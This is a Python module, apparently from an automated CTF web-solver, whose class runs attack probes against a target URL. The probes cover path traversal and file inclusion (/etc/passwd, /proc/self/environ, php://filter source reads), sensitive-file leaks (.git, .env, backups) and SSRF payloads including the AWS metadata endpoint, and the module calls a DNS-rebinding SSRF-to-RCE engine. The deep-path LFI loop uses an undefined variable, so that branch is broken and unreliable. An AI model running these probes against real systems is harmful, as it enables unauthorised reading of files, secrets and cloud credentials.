"""yang_web.core.smart_solver._web 混入 _WebFile —— 文件与网络侧（LFI / 泄露路径 / SSRF / SSRF-Rebind）。"""

from __future__ import annotations
import urllib.request
import urllib.error
import urllib.parse
from ._common import (_detect_php_source, _http_headers, _make_ssl_ctx, decode_body, find_flag, http_get)

class _WebFile:
    """文件与网络侧（LFI / 泄露路径 / SSRF / SSRF-Rebind）。"""
    
    def _try_lfi(self):
        """LFI / 路径遍历."""
        self.log("LFI", "running", "Path traversal probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        lfi_params = ["file", "page", "include", "path", "template", "view", 
                       "document", "read", "load", "dir", "src"]
        lfi_paths = [
            "/etc/passwd", "/etc/hosts", "../../etc/passwd",
            "....//....//etc/passwd", "/proc/self/environ",
            "/proc/self/cmdline", "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index",
        ]
        
        for param in lfi_params:
            for lfi_path in lfi_paths[:5]:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(lfi_path)}"
                code, body, _ = http_get(test_url)
                if body:
                    text = decode_body(body)
                    f = find_flag(text)
                    if f:
                        self.flag = f
                        self.log("LFI", "flag!", f"param={param}")
                        return
                    if "root:" in text:
                        self.log("LFI", "found", f"param={param} is LFI-vulnerable!")
                        # Try more paths
                        for deep_path in ["/flag", "/flag.txt", "/home/ctf/flag", 
                                           "/var/www/html/flag", "/root/flag"]:
                            dt = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(deep_path)}"
                            code, body, _ = http_get(dt)
                            df = find_flag(decode_body(dbody))
                            if df:
                                self.flag = df
                                self.log("LFI", "flag!", f"deep path: {deep_path}")
                                return
                        return
        
        self.log("LFI", "none", "No LFI found")
    
    def _try_leak_paths(self):
        """信息泄露路径探测."""
        self.log("Leak", "running", "Sensitive file probes")
        leak_paths = [
            "/.git/HEAD", "/.env", "/.DS_Store", "/flag", "/flag.txt",
            "/secret/flag", "/secret", "/robots.txt", "/.git/config",
            "/.svn/entries", "/backup.zip", "/www.zip", "/backup.sql",
            "/phpinfo.php", "/info.php", "/server-status", "/server-info",
            "/.htaccess", "/wp-config.php.bak", "/config.php.bak",
        ]
        
        for leak_path in leak_paths:
            test_url = f"{self.url}/{leak_path.lstrip('/')}"
            code, body, _ = http_get(test_url)
            if code and code != 404:
                text = decode_body(body)
                f = find_flag(text)
                if f:
                    self.flag = f
                    self.log("Leak", "flag!", f"path={leak_path}")
                    return
                if code == 200 and len(body) > 0:
                    self.log("Leak", "found", f"{leak_path} HTTP{code} ({len(body)}B)")
        
        self.log("Leak", "none", "No sensitive files found")
    
    def _try_ssrf(self):
        """SSRF 探测."""
        self.log("SSRF", "running", "Server-side request probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        ssrf_params = ["url", "uri", "path", "file", "src", "href", "redirect", 
                        "link", "target", "dest", "proxy", "fetch", "request"]
        ssrf_payloads = [
            "http://127.0.0.1:80", "http://localhost/flag",
            "http://0.0.0.0:80", "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        ]
        
        for param in ssrf_params:
            for payload in ssrf_payloads[:3]:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = http_get(test_url)
                if body:
                    f = find_flag(decode_body(body))
                    if f:
                        self.flag = f
                        self.log("SSRF", "flag!", f"param={param}")
                        return
        
        self.log("SSRF", "none", "No SSRF detected")

    def _try_ssrf_rebind(self):
        """SSRF DNS Rebinding → RCE — 委托给 ssrf_rebind 通用引擎."""
        self.log("SSRF-Rebind", "running", "ssrf_rebind v1.0")
        from yang_web.core.ssrf_rebind import auto_solve as sr_auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = sr_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("SSRF-Rebind", "flag!",
                         f"bypass={result.get('bypass')} cmd={result.get('cmd')}: {self.flag}")
            else:
                self.log("SSRF-Rebind", "none", result.get('status', 'No flag'))
